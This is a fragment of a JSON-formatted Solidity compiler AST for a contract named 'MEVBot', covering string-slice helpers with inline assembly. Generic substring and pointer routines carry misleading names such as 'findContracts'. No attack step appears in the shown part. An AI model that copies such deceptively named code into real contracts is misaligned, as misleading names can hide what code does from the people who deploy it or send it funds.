																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 241,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 191,
																					"src": "3036:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3026:17:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 243,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 195,
																				"src": "3046:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3026:29:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3015:40:0"
																	},
																	{
																		"assignments": [
																			247
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 247,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 269,
																				"src": "3073:15:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 246,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3073:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 248,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3073:15:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3115:36:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3117:32:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "3138:3:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3132:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3132:10:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "3144:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "3128:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3128:21:0"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "3117:7:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 216,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3144:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 203,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3138:3:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 247,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3117:7:0",
																				"valueSize": 1
																			}
																		],
																		"id": 249,
																		"nodeType": "InlineAssembly",
																		"src": "3106:45:0"
																	},
																	{
																		"body": {
																			"id": 265,
																			"nodeType": "Block",
																			"src": "3199:198:0",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 255,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 253,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 203,
																							"src": "3225:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 254,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 239,
																							"src": "3232:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "3225:10:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 260,
																					"nodeType": "IfStatement",
																					"src": "3221:64:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 258,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 256,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 193,
																								"src": "3268:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 257,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 191,
																								"src": "3278:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "3268:17:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 201,
																						"id": 259,
																						"nodeType": "Return",
																						"src": "3261:24:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 262,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "3307:5:0",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 261,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 203,
																							"src": "3307:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 263,
																					"nodeType": "ExpressionStatement",
																					"src": "3307:5:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3343:36:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3345:32:0",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "3366:3:0"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "3360:5:0"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "3360:10:0"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "3372:4:0"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "3356:3:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3356:21:0"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "3345:7:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 216,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3372:4:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 203,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3366:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 247,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3345:7:0",
																							"valueSize": 1
																						}
																					],
																					"id": 264,
																					"nodeType": "InlineAssembly",
																					"src": "3334:45:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 252,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 250,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 247,
																				"src": "3176:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 251,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 235,
																				"src": "3187:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "3176:21:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 266,
																		"nodeType": "WhileStatement",
																		"src": "3169:228:0"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 267,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 203,
																			"src": "3421:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 201,
																		"id": 268,
																		"nodeType": "Return",
																		"src": "3414:10:0"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 308,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 306,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 193,
														"src": "3937:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 307,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 191,
														"src": "3947:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3937:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 201,
												"id": 309,
												"nodeType": "Return",
												"src": "3930:24:0"
											}
										]
									},
									"documentation": null,
									"id": 311,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 198,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 191,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 311,
												"src": "2606:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 190,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2606:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 193,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 311,
												"src": "2620:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 192,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2620:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 195,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 311,
												"src": "2634:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 194,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2634:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 197,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 311,
												"src": "2650:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 196,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2650:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2605:60:0"
									},
									"returnParameters": {
										"id": 201,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 200,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 311,
												"src": "2688:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 199,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2688:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2687:6:0"
									},
									"scope": 1583,
									"src": "2583:1378:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 328,
										"nodeType": "Block",
										"src": "4177:127:0",
										"statements": [
											{
												"assignments": [
													319
												],
												"declarations": [
													{
														"constant": false,
														"id": 319,
														"mutability": "mutable",
														"name": "ret",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 328,
														"src": "4187:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 318,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4187:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 321,
												"initialValue": {
													"argumentTypes": null,
													"id": 320,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 313,
													"src": "4207:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4187:24:0"
											},
											{
												"assignments": [
													323
												],
												"declarations": [
													{
														"constant": false,
														"id": 323,
														"mutability": "mutable",
														"name": "retptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 328,
														"src": "4221:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 322,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4221:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 324,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4221:11:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4251:26:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4253:22:0",
															"value": {
																"arguments": [
																	{
																		"name": "ret",
																		"nodeType": "YulIdentifier",
																		"src": "4267:3:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4272:2:0",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4263:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "4263:12:0"
															},
															"variableNames": [
																{
																	"name": "retptr",
																	"nodeType": "YulIdentifier",
																	"src": "4253:6:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 319,
														"isOffset": false,
														"isSlot": false,
														"src": "4267:3:0",
														"valueSize": 1
													},
													{
														"declaration": 323,
														"isOffset": false,
														"isSlot": false,
														"src": "4253:6:0",
														"valueSize": 1
													}
												],
												"id": 325,
												"nodeType": "InlineAssembly",
												"src": "4242:35:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 326,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 319,
													"src": "4294:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 317,
												"id": 327,
												"nodeType": "Return",
												"src": "4287:10:0"
											}
										]
									},
									"documentation": null,
									"id": 329,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "loadCurrentContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 314,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 313,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "4119:18:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 312,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4119:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4118:20:0"
									},
									"returnParameters": {
										"id": 317,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 316,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "4162:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 315,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4162:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4161:15:0"
									},
									"scope": 1583,
									"src": "4090:214:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 446,
										"nodeType": "Block",
										"src": "4599:785:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 343,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 338,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 333,
															"src": "4609:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 340,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 39,
														"src": "4609:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 341,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 331,
															"src": "4621:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 342,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 39,
														"src": "4621:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4609:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 344,
												"nodeType": "ExpressionStatement",
												"src": "4609:21:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 348,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 345,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 331,
															"src": "4645:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 346,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "4645:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 347,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4658:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "4645:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 358,
												"nodeType": "IfStatement",
												"src": "4641:83:0",
												"trueBody": {
													"id": 357,
													"nodeType": "Block",
													"src": "4661:63:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 353,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 349,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 333,
																		"src": "4675:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 351,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 37,
																	"src": "4675:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 352,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4687:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "4675:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 354,
															"nodeType": "ExpressionStatement",
															"src": "4675:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 355,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 333,
																"src": "4709:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																	"typeString": "struct MEVBot.slice memory"
																}
															},
															"functionReturnParameters": 337,
															"id": 356,
															"nodeType": "Return",
															"src": "4702:11:0"
														}
													]
												}
											},
											{
												"assignments": [
													360
												],
												"declarations": [
													{
														"constant": false,
														"id": 360,
														"mutability": "mutable",
														"name": "l",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 446,
														"src": "4734:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 359,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4734:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 361,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4734:6:0"
											},
											{
												"assignments": [
													363
												],
												"declarations": [
													{
														"constant": false,
														"id": 363,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 446,
														"src": "4750:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 362,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4750:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 364,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4750:6:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4837:56:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4839:52:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "self",
																										"nodeType": "YulIdentifier",
																										"src": "4868:4:0"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "4874:2:0",
																										"type": "",
																										"value": "32"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "4864:3:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "4864:13:0"
																							}
																						],
																						"functionName": {
																							"name": "mload",
																							"nodeType": "YulIdentifier",
																							"src": "4858:5:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "4858:20:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "4880:2:0",
																						"type": "",
																						"value": "31"
																					}
																				],
																				"functionName": {
																					"name": "sub",
																					"nodeType": "YulIdentifier",
																					"src": "4854:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "4854:29:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "4848:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4848:36:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4886:4:0",
																		"type": "",
																		"value": "0xFF"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "4844:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "4844:47:0"
															},
															"variableNames": [
																{
																	"name": "b",
																	"nodeType": "YulIdentifier",
																	"src": "4839:1:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 363,
														"isOffset": false,
														"isSlot": false,
														"src": "4839:1:0",
														"valueSize": 1
													},
													{
														"declaration": 331,
														"isOffset": false,
														"isSlot": false,
														"src": "4868:4:0",
														"valueSize": 1
													}
												],
												"id": 365,
												"nodeType": "InlineAssembly",
												"src": "4828:65:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 368,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 366,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 363,
														"src": "4906:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 367,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4910:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "4906:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 376,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 374,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
